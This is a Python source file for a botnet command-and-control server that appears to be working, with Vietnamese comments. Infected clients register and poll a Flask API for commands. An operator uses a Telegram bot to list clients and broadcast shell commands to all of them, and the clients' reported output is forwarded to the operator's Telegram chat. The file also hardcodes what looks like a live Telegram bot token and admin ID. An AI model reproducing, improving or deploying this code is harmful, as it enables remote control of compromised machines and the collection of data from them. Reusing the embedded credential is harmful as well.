#!/usr/bin/env python3
from flask import Flask, request, jsonify
import json
import os
import threading
import time
import hashlib
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from apscheduler.schedulers.background import BackgroundScheduler

# ========== CẤU HÌNH ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8928657652:AAFmDv6nlNcoxqKtB2gmcZ1kyvnjj5rd2A8")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8003369858))
DATA_FILE = "botnet_data.json"
# ===============================

flask_app = Flask(__name__)

default_data = {"clients": {}, "tasks": []}

def load_data():
    if not os.path.exists(DATA_FILE):
        save_data(default_data)
        return default_data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ========== FLASK API ==========
@flask_app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "Botnet running", "clients": len(load_data()["clients"])})

@flask_app.route("/register", methods=["POST"])
def register():
    data = request.json
    client_id = data.get("client_id")
    if not client_id:
        return jsonify({"status": "error"}), 400
    
    bot_data = load_data()
    if client_id not in bot_data["clients"]:
        bot_data["clients"][client_id] = {
            "ip": request.remote_addr,
            "status": "online",
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "command": None
        }
    else:
        bot_data["clients"][client_id]["status"] = "online"
        bot_data["clients"][client_id]["last_seen"] = datetime.now().isoformat()
    
    save_data(bot_data)
    return jsonify({"status": "ok"})

@flask_app.route("/poll", methods=["POST"])
def poll():
    data = request.json
    client_id = data.get("client_id")
    if not client_id:
        return jsonify({"status": "error"}), 400
    
    bot_data = load_data()
    if client_id not in bot_data["clients"]:
        return jsonify({"status": "error"}), 404
    
    bot_data["clients"][client_id]["last_seen"] = datetime.now().isoformat()
    bot_data["clients"][client_id]["status"] = "online"
    
    cmd = bot_data["clients"][client_id].get("command")
    bot_data["clients"][client_id]["command"] = None
    save_data(bot_data)
    
    return jsonify({"status": "ok", "command": cmd})

@flask_app.route("/report", methods=["POST"])
def report():
    data = request.json
    client_id = data.get("client_id")
    content = data.get("content", "")
    
    # Gửi log đến Telegram admin
    try:
        import requests
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        msg = f"📥 {client_id}\n{content[:3000]}"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": msg}, timeout=5)
    except:
        pass
    
    return jsonify({"status": "ok"})

# ========== TELEGRAM BOT HANDLERS ==========
def start(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("🚫 Unauthorized")
        return
    
    keyboard = [
        [InlineKeyboardButton("📋 List Clients", callback_data="list")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("⚡ Broadcast", callback_data="broadcast")]
    ]
    update.message.reply_text("🤖 BotNet Controller", reply_markup=InlineKeyboardMarkup(keyboard))

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    if update.effective_user.id != ADMIN_ID:
        query.edit_message_text("🚫 Unauthorized")
        return
    
    data = query.data
    bot_data = load_data()
    
    if data == "list":
        if not bot_data["clients"]:
            query.edit_message_text("No clients")
            return
        text = "📋 Clients:\n" + "\n".join([f"{c[:16]}... | {info['status']}" for c, info in bot_data["clients"].items()])
        query.edit_message_text(text)
    
    elif data == "stats":
        clients = bot_data["clients"]
        online = sum(1 for c in clients.values() if c["status"] == "online")
        query.edit_message_text(f"📊 Total: {len(clients)}\nOnline: {online}\nOffline: {len(clients)-online}")
    
    elif data == "broadcast":
        context.user_data["broadcast"] = True
        query.edit_message_text("Nhập lệnh broadcast: /cmd <lệnh>")

def cmd_handler(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        update.message.reply_text("⚠️ /cmd <lệnh>")
        return
    
    cmd = " ".join(context.args)
    bot_data = load_data()
    count = 0
    for cid in bot_data["clients"]:
        bot_data["clients"][cid]["command"] = f"shell:{cmd}"
        count += 1
    save_data(bot_data)
    update.message.reply_text(f"✅ Sent to {count} clients")

# ========== MAIN ==========
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("cmd", cmd_handler))
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Bot started...")
    updater.start_polling()
    updater.idle()
